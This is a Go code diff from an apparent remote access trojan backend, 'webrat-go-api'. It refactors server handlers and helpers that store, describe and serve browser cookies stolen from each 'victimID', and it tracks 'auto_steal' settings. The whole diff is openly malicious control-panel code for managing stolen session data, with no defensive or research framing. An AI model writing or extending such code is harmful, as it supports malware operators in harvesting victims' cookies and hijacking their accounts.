@@ -9,6 +9,8 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
+
+	"webrat-go-api/internal/stealstore"
 )
 
 func (s *Server) handleStealInfo(w http.ResponseWriter, r *http.Request) {
@@ -32,7 +34,7 @@ func (s *Server) handleStealInfo(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	dir := stealDataDir(victimID)
+	dir := stealstore.DataDir(victimID)
 	autoSteal := "disabled"
 	stealTime := "-"
 
@@ -76,7 +78,7 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	dir := stealDataDir(victimID)
+	dir := stealstore.DataDir(victimID)
 	browserDir := filepath.Join(dir, "Browser")
 
 	entries, err := os.ReadDir(browserDir)
@@ -105,57 +107,4 @@ func (s *Server) handleStealDownload(w http.ResponseWriter, r *http.Request) {
 		}
 		_, _ = fw.Write(data)
 	}
-}
-
-func StealDataDir(victimID string) string {
-	return stealDataDir(victimID)
-}
-
-func stealDataDir(victimID string) string {
-	base := strings.TrimSpace(os.Getenv("WEBRAT_STEAL_DIR"))
-	if base == "" {
-		wd, _ := os.Getwd()
-		base = filepath.Join(wd, "steal_data")
-	}
-	return filepath.Join(base, victimID)
-}
-
-func SaveStealResult(victimID string, browserName string, cookies string) error {
-	dir := filepath.Join(stealDataDir(victimID), "Browser")
-	if err := os.MkdirAll(dir, 0o755); err != nil {
-		return err
-	}
-
-	fname := strings.ReplaceAll(browserName, " ", "") + "Cookies.txt"
-	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
-}
-
-func UpdateStealMeta(victimID, autoSteal string) error {
-	dir := stealDataDir(victimID)
-	if err := os.MkdirAll(dir, 0o755); err != nil {
-		return err
-	}
-
-	metaPath := filepath.Join(dir, "meta.json")
-
-	meta := map[string]string{
-		"auto_steal": autoSteal,
-		"steal_time": time.Now().Format("02.01.2006, 15:04:05"),
-	}
-
-	existing, err := os.ReadFile(metaPath)
-	if err == nil {
-		var old map[string]string
-		if json.Unmarshal(existing, &old) == nil {
-			if autoSteal == "" && old["auto_steal"] != "" {
-				meta["auto_steal"] = old["auto_steal"]
-			}
-		}
-	}
-
-	data, err := json.MarshalIndent(meta, "", "  ")
-	if err != nil {
-		return err
-	}
-	return os.WriteFile(metaPath, data, 0o644)
 }
